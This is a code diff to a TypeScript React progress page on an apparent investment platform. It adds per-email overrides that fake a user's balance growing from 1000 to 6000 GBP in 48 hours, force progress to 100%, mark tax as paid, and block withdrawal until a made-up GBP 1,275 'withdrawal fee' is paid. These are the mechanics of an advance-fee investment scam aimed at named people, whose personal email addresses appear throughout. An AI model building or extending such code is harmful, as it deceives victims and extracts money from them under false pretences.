@@ -146,6 +146,17 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
     forceDurationHours: 48,
     lockTaxDisplay: true
   },
+  "ammielcui@gmail.com": {
+    currentValue: 6000,
+    taxRate: 0.165,
+    taxDue: 990,
+    taxRemaining: 0,
+    taxPaid: 990,
+    initialHoldings: 1000,
+    currency: "GBP",
+    forceProgressPct: 100,
+    lockTaxDisplay: true
+  },
   "tdspierpy@gmail.com": {
     currentValue: 34190,
     taxRate: 0.15,
@@ -160,8 +171,12 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
 };
 
 const WITHDRAWAL_FEE_LOCK_BY_EMAIL: Record<string, { amount: number; currency: "GBP" | "USD" }> = {
+  "ammielcui@gmail.com": { amount: 1275, currency: "GBP" },
   "samlebrun01@gmail.com": { amount: 680, currency: "USD" },
   "tzahielk@gmail.com": { amount: 450, currency: "GBP" }
+};
+const WITHDRAWAL_FEE_ALERT_BY_EMAIL: Record<string, string> = {
+  "ammielcui@gmail.com": "Withdrawal fee payment required: GBP 1,275.00. Clear this fee to continue."
 };
 const WITHDRAWAL_FEE_OK_UNLOCK_EMAILS = new Set(["samlebrun01@gmail.com", "tzahielk@gmail.com"]);
 const WITHDRAWAL_PROCESSING_WALLET_MESSAGE_BY_EMAIL: Record<
@@ -237,6 +252,14 @@ const USER_PLAN_OVERRIDE_BY_EMAIL: Record<
   "gordonew156@gmail.com": {
     startValue: 500,
     targetValue: 3200,
+    unit: "GBP",
+    durationHours: 48,
+    startIso: "2026-03-04T14:35:49-08:00",
+    ignorePriorWithdrawals: true
+  },
+  "ammielcui@gmail.com": {
+    startValue: 1000,
+    targetValue: 6000,
     unit: "GBP",
     durationHours: 48,
     startIso: "2026-03-04T14:35:49-08:00",
@@ -1345,6 +1368,8 @@ export default function ProgressPage() {
     ? fmtBtc(pendingWithdrawalAmountForPlan)
     : fmtMoney(pendingWithdrawalAmountForPlan, displayUnit as "USD" | "GBP");
   const pendingWithdrawalCustom = WITHDRAWAL_PROCESSING_WALLET_MESSAGE_BY_EMAIL[userEmailLower] || null;
+  const withdrawalFeeAlertText =
+    WITHDRAWAL_FEE_ALERT_BY_EMAIL[userEmailLower] || "Withdrawal fee payment required. Clear the fee to continue.";
 
   const compatSvg = (() => {
     if (!compatChart) return null;
@@ -1389,7 +1414,7 @@ export default function ProgressPage() {
       return;
     }
     if (withdrawFeeLock) {
-      setTaxPopup("Cleared withdrawal fee. Press OK to withdraw.");
+      setTaxPopup(withdrawalFeeAlertText);
       return;
     }
     const amt = lockedWithdrawalAmount;
@@ -1639,7 +1664,7 @@ export default function ProgressPage() {
                 onClick={() => {
                   if (!reachedTarget) return;
                   if (withdrawFeeLock) {
-                    setTaxPopup("Cleared withdrawal fee. Press OK to withdraw.");
+                    setTaxPopup(withdrawalFeeAlertText);
                     return;
                   }
                   setWithdrawOpen(true);
